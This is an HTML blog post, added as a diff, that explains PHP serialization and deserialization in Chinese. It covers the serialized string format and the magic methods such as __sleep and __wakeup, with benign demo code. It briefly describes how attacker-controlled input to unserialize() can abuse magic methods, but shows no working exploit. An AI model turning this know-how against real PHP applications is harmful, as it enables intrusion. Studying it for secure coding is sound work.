@@ -1,0 +1,669 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<meta http-equiv="X-UA-Compatible" content="ie=edge">
+	<meta name="theme-color" content="#494f5c">
+	<meta name="msapplication-TileColor" content="#494f5c">
+<meta itemprop="name" content="浅谈php序列化与反序列化">
+<meta itemprop="description" content="基础知识  现在我们都会在淘宝上买桌子，这时候一般都会把它拆掉成板子，再装到箱子里面，就可以快递寄出去了，这个过程就类似我们的序列化的过程（把数据转化为可以存储或者传输的形式）。当买家收到货后，就需要自己把这些板子组装成桌子的样子，这个过程就像反序列的过程（转化成当初的数据对象）。
+也就是说，序列化的目的是方便传输和存储。
+在PHP应用中，序列化和反序列化一般用做缓存，比如session，cookie等。
+  PHP序列化：php为了方便进行数据的传输，允许把复杂的数据结构，压缩到一个字符串中，使用serialize()函数。 PHP反序列化：将被压缩为字符串的复杂数据结构，重新恢复，使用unserialize()函数。 PHP反序列化漏洞：如果代码中使用了反序列化 unserialize()函数，并且参数可控，且程序没有对用户输入的反序列化字符串进行校验，那么可以通过在本地构造序列化字符串，同时利用PHP中的一系列magic方法来达到想要实现的目的，如控制对象内部的变量甚至是函数。  序列化格式 &lt;?php $str=&#39;Theoyu&#39;; $bool=true; $null=NULL; $arr=array(&#39;a&#39;=&gt;1,&#39;b&#39;=&gt;2); class A { public $x; private $y; public function __construct($x,$y) { $this-&gt;x=$x; $this-&gt;y=$y; } } $test=new A(3,&#34;theoyu&#34;); echo(serialize($str).&#39;&lt;/br&gt;&#39;); //s:6:&#34;Theoyu&#34;; echo(serialize($bool).&#39;&lt;/br&gt;&#39;); //b:1; echo(serialize($null).&#39;&lt;/br&gt;&#39;); //N; echo(serialize($arr).&#39;&lt;/br&gt;&#39;); //a:2{s:1:&#34;a&#34;;i:1;s:1:&#34;b&#34;;i:2;} echo(serialize($test).&#39;&lt;/br&gt;&#39;); //O:1:&#34;A&#34;:2:{s:1:&#34;x&#34;;i:3;s:4:&#34;Ay&#34;;s:6:&#34;theoyu&#34;;}  ?&gt;序列化对不同类型得到的字符串格式为：
+ string ： s:size:value; Integer： i:value; Boolean b:value;(1 or 0) NULL N; Array a:size:{key definition;value definition;······}definition 类似string or Integer Object O:类名长度:&ldquo;类名&rdquo;:属性数量:{属性类型:属性名长度:属性名:value definition······}  Magic methods PHP16个魔术方法 PHP中把比双下划线__开头的方法称为魔术方法，这些发在达到某些条件时会自动被调用："><meta itemprop="datePublished" content="2020-11-09T23:30:20&#43;08:00" />
+<meta itemprop="dateModified" content="2020-11-09T23:30:20&#43;08:00" />
+<meta itemprop="wordCount" content="705">
+<meta itemprop="keywords" content="" /><meta property="og:title" content="浅谈php序列化与反序列化" />
+<meta property="og:description" content="基础知识  现在我们都会在淘宝上买桌子，这时候一般都会把它拆掉成板子，再装到箱子里面，就可以快递寄出去了，这个过程就类似我们的序列化的过程（把数据转化为可以存储或者传输的形式）。当买家收到货后，就需要自己把这些板子组装成桌子的样子，这个过程就像反序列的过程（转化成当初的数据对象）。
+也就是说，序列化的目的是方便传输和存储。
+在PHP应用中，序列化和反序列化一般用做缓存，比如session，cookie等。
+  PHP序列化：php为了方便进行数据的传输，允许把复杂的数据结构，压缩到一个字符串中，使用serialize()函数。 PHP反序列化：将被压缩为字符串的复杂数据结构，重新恢复，使用unserialize()函数。 PHP反序列化漏洞：如果代码中使用了反序列化 unserialize()函数，并且参数可控，且程序没有对用户输入的反序列化字符串进行校验，那么可以通过在本地构造序列化字符串，同时利用PHP中的一系列magic方法来达到想要实现的目的，如控制对象内部的变量甚至是函数。  序列化格式 &lt;?php $str=&#39;Theoyu&#39;; $bool=true; $null=NULL; $arr=array(&#39;a&#39;=&gt;1,&#39;b&#39;=&gt;2); class A { public $x; private $y; public function __construct($x,$y) { $this-&gt;x=$x; $this-&gt;y=$y; } } $test=new A(3,&#34;theoyu&#34;); echo(serialize($str).&#39;&lt;/br&gt;&#39;); //s:6:&#34;Theoyu&#34;; echo(serialize($bool).&#39;&lt;/br&gt;&#39;); //b:1; echo(serialize($null).&#39;&lt;/br&gt;&#39;); //N; echo(serialize($arr).&#39;&lt;/br&gt;&#39;); //a:2{s:1:&#34;a&#34;;i:1;s:1:&#34;b&#34;;i:2;} echo(serialize($test).&#39;&lt;/br&gt;&#39;); //O:1:&#34;A&#34;:2:{s:1:&#34;x&#34;;i:3;s:4:&#34;Ay&#34;;s:6:&#34;theoyu&#34;;}  ?&gt;序列化对不同类型得到的字符串格式为：
+ string ： s:size:value; Integer： i:value; Boolean b:value;(1 or 0) NULL N; Array a:size:{key definition;value definition;······}definition 类似string or Integer Object O:类名长度:&ldquo;类名&rdquo;:属性数量:{属性类型:属性名长度:属性名:value definition······}  Magic methods PHP16个魔术方法 PHP中把比双下划线__开头的方法称为魔术方法，这些发在达到某些条件时会自动被调用：" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://theoyu.top/posts/%E5%BA%8F%E5%88%97%E5%8C%96/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2020-11-09T23:30:20&#43;08:00" />
+<meta property="article:modified_time" content="2020-11-09T23:30:20&#43;08:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="浅谈php序列化与反序列化"/>
+<meta name="twitter:description" content="基础知识  现在我们都会在淘宝上买桌子，这时候一般都会把它拆掉成板子，再装到箱子里面，就可以快递寄出去了，这个过程就类似我们的序列化的过程（把数据转化为可以存储或者传输的形式）。当买家收到货后，就需要自己把这些板子组装成桌子的样子，这个过程就像反序列的过程（转化成当初的数据对象）。
+也就是说，序列化的目的是方便传输和存储。
+在PHP应用中，序列化和反序列化一般用做缓存，比如session，cookie等。
+  PHP序列化：php为了方便进行数据的传输，允许把复杂的数据结构，压缩到一个字符串中，使用serialize()函数。 PHP反序列化：将被压缩为字符串的复杂数据结构，重新恢复，使用unserialize()函数。 PHP反序列化漏洞：如果代码中使用了反序列化 unserialize()函数，并且参数可控，且程序没有对用户输入的反序列化字符串进行校验，那么可以通过在本地构造序列化字符串，同时利用PHP中的一系列magic方法来达到想要实现的目的，如控制对象内部的变量甚至是函数。  序列化格式 &lt;?php $str=&#39;Theoyu&#39;; $bool=true; $null=NULL; $arr=array(&#39;a&#39;=&gt;1,&#39;b&#39;=&gt;2); class A { public $x; private $y; public function __construct($x,$y) { $this-&gt;x=$x; $this-&gt;y=$y; } } $test=new A(3,&#34;theoyu&#34;); echo(serialize($str).&#39;&lt;/br&gt;&#39;); //s:6:&#34;Theoyu&#34;; echo(serialize($bool).&#39;&lt;/br&gt;&#39;); //b:1; echo(serialize($null).&#39;&lt;/br&gt;&#39;); //N; echo(serialize($arr).&#39;&lt;/br&gt;&#39;); //a:2{s:1:&#34;a&#34;;i:1;s:1:&#34;b&#34;;i:2;} echo(serialize($test).&#39;&lt;/br&gt;&#39;); //O:1:&#34;A&#34;:2:{s:1:&#34;x&#34;;i:3;s:4:&#34;Ay&#34;;s:6:&#34;theoyu&#34;;}  ?&gt;序列化对不同类型得到的字符串格式为：
+ string ： s:size:value; Integer： i:value; Boolean b:value;(1 or 0) NULL N; Array a:size:{key definition;value definition;······}definition 类似string or Integer Object O:类名长度:&ldquo;类名&rdquo;:属性数量:{属性类型:属性名长度:属性名:value definition······}  Magic methods PHP16个魔术方法 PHP中把比双下划线__开头的方法称为魔术方法，这些发在达到某些条件时会自动被调用："/>
+
+	<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+	<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+	<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+	<link rel="manifest" href="/site.webmanifest">
+	<link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+	<link rel="shortcut icon" href="/favicon.ico">
+
+	<title>浅谈php序列化与反序列化</title>
+	<link rel="stylesheet" href="https://theoyu.top/css/style.min.30fdc0da2239aa820f96432ceb94fffac062559579f2544e381335700f6891d0.css" integrity="sha256-MP3A2iI5qoIPlkMs65T/+sBiVZV58lROOBM1cA9okdA=" crossorigin="anonymous">
+	
+</head>
+
+<body id="page">
+	
+	<header id="site-header" class="animated slideInUp">
+		<div class="hdr-wrapper section-inner">
+			<div class="hdr-left">
+				<div class="site-branding">
+					<a href="https://theoyu.top/">Theoyu&#39;s Blog</a>
+				</div>
+				<nav class="site-nav hide-in-mobile">
+					
+				<a href="https://theoyu.top/posts/">Posts</a>
+				<a href="https://theoyu.top/about-me/">About</a>
+
+				</nav>
+			</div>
+			<div class="hdr-right hdr-icons">
+				<button id="toc-btn" class="hdr-btn desktop-only-ib" title=""><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-list"><line x1="8" y1="6" x2="21" y2="6"></line><line x1="8" y1="12" x2="21" y2="12"></line><line x1="8" y1="18" x2="21" y2="18"></line><line x1="3" y1="6" x2="3" y2="6"></line><line x1="3" y1="12" x2="3" y2="12"></line><line x1="3" y1="18" x2="3" y2="18"></line></svg></button><span class="hdr-social hide-in-mobile"><a href="mailto:zeyu.ou@outlook.com" target="_blank" rel="noopener me" title="Email"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg></a><a href="https://instagram.com/" target="_blank" rel="noopener me" title="Instagram"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="2" width="20" height="20" rx="5" ry="5"></rect><path d="M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z"></path><line x1="17.5" y1="6.5" x2="17.5" y2="6.5"></line></svg></a><a href="https://github.com/" target="_blank" rel="noopener me" title="Github"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path></svg></a></span><button id="menu-btn" class="hdr-btn" title=""><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-menu"><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg></button>
+			</div>
+		</div>
+	</header>
+	<div id="mobile-menu" class="animated fast">
+		<ul>
+			<li><a href="https://theoyu.top/posts/">Posts</a></li>
+			<li><a href="https://theoyu.top/about-me/">About</a></li>
+		</ul>
+	</div>
+
+
+	<main class="site-main section-inner animated fadeIn faster">
+		<article class="thin">
+			<header class="post-header">
+				<div class="post-meta"><span>Nov 9, 2020</span></div>
+				<h1>浅谈php序列化与反序列化</h1>
+			</header>
+			<div class="content">
+				<h2 id="基础知识">基础知识<a href="#基础知识" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
+<blockquote>
+<p>现在我们都会在淘宝上买桌子，这时候一般都会把它拆掉成板子，再装到箱子里面，就可以快递寄出去了，这个过程就类似我们的序列化的过程（把数据转化为可以存储或者传输的形式）。当买家收到货后，就需要自己把这些板子组装成桌子的样子，这个过程就像反序列的过程（转化成当初的数据对象）。</p>
+<p>也就是说，序列化的目的是方便传输和存储。</p>
+<p>在PHP应用中，序列化和反序列化一般用做缓存，比如session，cookie等。</p>
+</blockquote>
+<ul>
+<li>PHP序列化：php为了方便进行数据的传输，允许把复杂的数据结构，压缩到一个字符串中，使用<code>serialize()</code>函数。</li>
+<li>PHP反序列化：将被压缩为字符串的复杂数据结构，重新恢复，使用<code>unserialize()</code>函数。</li>
+<li>PHP反序列化漏洞：如果代码中使用了反序列化 <code>unserialize()</code>函数，并且参数可控，且程序没有对用户输入的反序列化字符串进行校验，那么可以通过在本地构造序列化字符串，同时利用PHP中的一系列<strong>magic</strong>方法来达到想要实现的目的，如控制对象内部的变量甚至是函数。</li>
+</ul>
+<h2 id="序列化格式">序列化格式<a href="#序列化格式" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+
+<span class="nv">$str</span><span class="o">=</span><span class="s1">&#39;Theoyu&#39;</span><span class="p">;</span>
+<span class="nv">$bool</span><span class="o">=</span><span class="k">true</span><span class="p">;</span>
+<span class="nv">$null</span><span class="o">=</span><span class="k">NULL</span><span class="p">;</span>
+<span class="nv">$arr</span><span class="o">=</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="o">=&gt;</span><span class="mi">1</span><span class="p">,</span><span class="s1">&#39;b&#39;</span><span class="o">=&gt;</span><span class="mi">2</span><span class="p">);</span>
+
+<span class="k">class</span> <span class="nc">A</span>
+<span class="p">{</span>
+    <span class="k">public</span> <span class="nv">$x</span><span class="p">;</span>
+    <span class="k">private</span> <span class="nv">$y</span><span class="p">;</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$x</span><span class="p">,</span><span class="nv">$y</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">x</span><span class="o">=</span><span class="nv">$x</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">y</span><span class="o">=</span><span class="nv">$y</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="nv">$test</span><span class="o">=</span><span class="k">new</span> <span class="nx">A</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="s2">&#34;theoyu&#34;</span><span class="p">);</span>      
+<span class="k">echo</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&lt;/br&gt;&#39;</span><span class="p">);</span>    <span class="c1">//s:6:&#34;Theoyu&#34;;
+</span><span class="c1"></span><span class="k">echo</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$bool</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&lt;/br&gt;&#39;</span><span class="p">);</span>   <span class="c1">//b:1;
+</span><span class="c1"></span><span class="k">echo</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$null</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&lt;/br&gt;&#39;</span><span class="p">);</span>   <span class="c1">//N;
+</span><span class="c1"></span><span class="k">echo</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$arr</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&lt;/br&gt;&#39;</span><span class="p">);</span>    <span class="c1">//a:2{s:1:&#34;a&#34;;i:1;s:1:&#34;b&#34;;i:2;}
+</span><span class="c1"></span><span class="k">echo</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$test</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&lt;/br&gt;&#39;</span><span class="p">);</span>   <span class="c1">//O:1:&#34;A&#34;:2:{s:1:&#34;x&#34;;i:3;s:4:&#34;Ay&#34;;s:6:&#34;theoyu&#34;;}
+</span><span class="c1"></span>
+<span class="cp">?&gt;</span><span class="err">
+</span></code></pre></div><p>序列化对不同类型得到的字符串格式为：</p>
+<ul>
+<li>string ：   s:size:value;</li>
+<li>Integer：  i:value;</li>
+<li>Boolean   b:value;(1 or 0)</li>
+<li>NULL       N;</li>
+<li>Array       a:size:{key definition;value definition;······}definition 类似string or Integer</li>
+<li>Object      O:类名长度:&ldquo;类名&rdquo;:属性数量:{属性类型:属性名长度:属性名:value definition······}</li>
+</ul>
+<h2 id="magic-methods">Magic methods<a href="#magic-methods" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
+<h3 id="php16个魔术方法">PHP16个魔术方法<a href="#php16个魔术方法" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
+<p>PHP中把比双下划线__开头的方法称为魔术方法，这些发在达到某些条件时会自动被调用：</p>
+<ol>
+<li>__construct():类的构造函数，当一个类被创建时自动调用</li>
+<li>__destruct)(),类的析构函数，当一个类被销毁时自动调用</li>
+<li>__sleep()，执行serialize()进行序列化时，先会调用这个函数</li>
+<li>__wakeup()，执行unserialize()进行反序列化时，先会调用这个函数</li>
+<li>__toString()，当把一个对象被当作字符串时被自动调用</li>
+<li>__invoke()，当把一个类当作函数使用时自动调用</li>
+<li>__call()，在对象中调用一个不可访问方法时调用</li>
+<li>__callStatic()，用静态方式中调用一个不可访问方法时调用</li>
+<li>__get()，获得一个类的不可访问成员变量时调用(不存在或为private)</li>
+<li>__set()，设置一个类的成员变量时调用(不存在或为private)</li>
+<li>__isset()，当对不可访问属性调用isset()或empty()时调用</li>
+<li>__unset()，当对不可访问属性调用unset()时被调用。</li>
+<li>__set_state()，调用var_export()导出类时，此静态方法会被调用。</li>
+<li>__clone()，当对象复制完成时调用</li>
+<li>__autoload()，尝试加载未定义的类</li>
+<li>__debugInfo()，打印所需调试信息
+几个常用的魔术方法具体实现。</li>
+</ol>
+<p><code> __construct()</code></p>
+<blockquote>
+<p>类似c++的构造函数</p>
+<p><strong>需要指出</strong>，PHP不支持构造函数重载，所以一个类只能声明<strong>一个</strong>构造函数！</p>
+</blockquote>
+<p><code>__destruct()</code></p>
+<blockquote>
+<p>同上，类似c++..</p>
+</blockquote>
+<p><code>__sleep()</code></p>
+<blockquote>
+<p>serialize()函数会检查类中是否存在一个魔术方法__sleep(),如果存在，则该方法会优先被调用。</p>
+</blockquote>
+<ul>
+<li>该函数必须至少返回一个所包含对象中的变量名称</li>
+<li>没有返回的变量将不会输出。</li>
+</ul>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<span class="k">class</span> <span class="nc">Person</span>
+<span class="p">{</span>
+    <span class="k">public</span> <span class="nv">$name</span><span class="p">;</span>
+    <span class="k">public</span> <span class="nv">$sex</span><span class="p">;</span>
+    <span class="k">public</span> <span class="nv">$age</span><span class="p">;</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span><span class="nv">$sex</span><span class="p">,</span><span class="nv">$age</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="o">=</span><span class="nv">$name</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">sex</span><span class="o">=</span><span class="nv">$sex</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">age</span><span class="o">=</span><span class="nv">$age</span><span class="p">;</span>       
+    <span class="p">}</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="fm">__sleep</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="k">echo</span><span class="s2">&#34;我是__sleep()函数，我被调用了,你以为你还叫theoyu？&lt;br&gt;&#34;</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="o">=</span><span class="nx">base64_encode</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">);</span>
+        <span class="k">return</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;name&#39;</span><span class="p">,</span><span class="s1">&#39;sex&#39;</span><span class="p">);</span><span class="c1">//没有返回age
+</span><span class="c1"></span>    <span class="p">}</span>
+
+
+<span class="p">}</span>
+<span class="nv">$person</span> <span class="o">=</span><span class="k">new</span> <span class="nx">Person</span><span class="p">(</span><span class="s1">&#39;theoyu&#39;</span><span class="p">,</span><span class="s1">&#39;男&#39;</span><span class="p">,</span><span class="s1">&#39;20&#39;</span><span class="p">);</span>
+<span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$person</span><span class="p">)</span>
+<span class="cp">?&gt;</span><span class="err">
+</span></code></pre></div><p>输出：</p>
+<div class="highlight"><pre class="chroma"><code class="language-txt" data-lang="txt">我是__sleep()函数，我被调用了,你以为你还叫theoyu？
+O:6:&#34;Person&#34;:2 :{s:4:&#34;name&#34;;s:8:&#34;dGhlb3l1&#34;;s:3:&#34;sex&#34;;s:3:&#34;男&#34;;}
+</code></pre></div><p>没有年龄。</p>
+<p><code>__wakeup()</code></p>
+<blockquote>
+<p>unserialize()前会检查是否存在__wakeup()，如果存在会优先调动。</p>
+<p>和__sleep()相比，不需要返回数组。</p>
+</blockquote>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<span class="k">class</span> <span class="nc">Person</span>
+<span class="p">{</span>
+    <span class="k">public</span> <span class="nv">$name</span><span class="p">;</span>
+    <span class="k">public</span> <span class="nv">$sex</span><span class="p">;</span>
+    <span class="k">public</span> <span class="nv">$age</span><span class="p">;</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span><span class="nv">$sex</span><span class="p">,</span><span class="nv">$age</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="o">=</span><span class="nv">$name</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">sex</span><span class="o">=</span><span class="nv">$sex</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">age</span><span class="o">=</span><span class="nv">$age</span><span class="p">;</span>       
+    <span class="p">}</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="fm">__sleep</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="k">echo</span><span class="s2">&#34;我是__sleep()函数，我被调用了,你以为你还叫theoyu？&lt;br&gt;&#34;</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="o">=</span><span class="nx">base64_encode</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">);</span>
+        <span class="k">return</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;name&#39;</span><span class="p">,</span><span class="s1">&#39;sex&#39;</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="k">echo</span><span class="s2">&#34;我是__wakeup()函数，你重新拥有了你的名字&lt;br&gt;&#34;</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="o">=</span><span class="nx">base64_decode</span><span class="p">(</span><span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">));</span> <span class="c1">//这里需要两次解码，因为__sleep()调用了两次
+</span><span class="c1"></span>    <span class="p">}</span>
+
+
+<span class="p">}</span>
+<span class="nv">$person</span> <span class="o">=</span><span class="k">new</span> <span class="nx">Person</span><span class="p">(</span><span class="s1">&#39;theoyu&#39;</span><span class="p">,</span><span class="s1">&#39;男&#39;</span><span class="p">,</span><span class="s1">&#39;20&#39;</span><span class="p">);</span>
+<span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$person</span><span class="p">)</span><span class="o">.</span><span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
+<span class="nx">var_dump</span><span class="p">(</span><span class="nx">unserialize</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$person</span><span class="p">)));</span>
+
+<span class="cp">?&gt;</span><span class="err">
+</span></code></pre></div><p>输出：</p>
+<pre><code>我是__sleep()函数，我被调用了,你以为你还叫theoyu？
+O:6:&quot;Person&quot;:2:{s:4:&quot;name&quot;;s:8:&quot;dGhlb3l1&quot;;s:3:&quot;sex&quot;;s:3:&quot;男&quot;;}
+我是__sleep()函数，我被调用了,你以为你还叫theoyu？
+我是__wakeup()函数，你重新拥有了你的名字
+object(Person)#2 (3) { [&quot;name&quot;]=&gt; string(6) &quot;theoyu&quot; [&quot;sex&quot;]=&gt; string(3) &quot;男&quot; [&quot;age&quot;]=&gt; NULL }
+</code></pre><p>&hellip;忽然发现好中二= =</p>
+<p><code>__toString()</code></p>
+<ul>
+<li><strong>__toString()</strong> 用于一个对象被当作字符串时应该如何回应，应该显示什么。</li>
+<li><strong>__toString()</strong> 必须返回一个字符串。</li>
+</ul>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+    <span class="k">class</span> <span class="nc">A</span>
+    <span class="p">{</span>
+        <span class="k">public</span> <span class="nv">$test</span><span class="p">;</span>
+        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$test</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">test</span><span class="o">=</span><span class="nv">$test</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="k">function</span> <span class="fm">__toString</span><span class="p">()</span>
+        <span class="p">{</span>
+            <span class="nv">$str</span><span class="o">=</span><span class="s2">&#34;this is __toString&#34;</span><span class="p">;</span>
+            <span class="k">return</span> <span class="nv">$str</span><span class="p">;</span>    <span class="c1">//__toString() must return a string value
+</span><span class="c1"></span>        <span class="p">}</span>
+
+    <span class="p">}</span>
+     <span class="nv">$a</span><span class="o">=</span><span class="k">new</span> <span class="nx">A</span><span class="p">(</span><span class="mi">3</span><span class="p">);</span>
+     <span class="k">echo</span> <span class="nv">$a</span><span class="p">;</span>         <span class="c1">//this is __toString
+</span><span class="c1"></span><span class="cp">?&gt;</span><span class="err">
+</span></code></pre></div><p><code>__invoke()</code></p>
+<ul>
+<li>一个对象被当作函数调用时，<strong>__invoke()</strong> 会自动被调用。</li>
+</ul>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+    <span class="k">class</span> <span class="nc">A</span>
+    <span class="p">{</span>
+        <span class="k">public</span> <span class="nv">$test</span><span class="p">;</span>
+        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$test</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">test</span><span class="o">=</span><span class="nv">$test</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="k">function</span> <span class="fm">__invoke</span><span class="p">()</span>
+        <span class="p">{</span>
+            <span class="k">echo</span> <span class="s2">&#34;this is __invoke&#34;</span><span class="p">;</span>
+        <span class="p">}</span>
+
+    <span class="p">}</span>
+     <span class="nv">$a</span><span class="o">=</span><span class="k">new</span> <span class="nx">A</span><span class="p">(</span><span class="mi">3</span><span class="p">);</span>
+     <span class="nv">$a</span><span class="p">();</span>         <span class="c1">//this is __invoke
+</span><span class="c1"></span><span class="cp">?&gt;</span><span class="err">
+</span></code></pre></div><p><code> __call()</code></p>
+<ul>
+<li>调用类不存在的函数时，__call()会被调用，保证程序正常进行。</li>
+<li>格式 <strong>function __call($function_name,$arguments)</strong></li>
+<li>第一个参数会自动接收不存在函数的函数名，第二个参数以<strong>数组</strong>方式接收不存在函数的多个参数。</li>
+</ul>
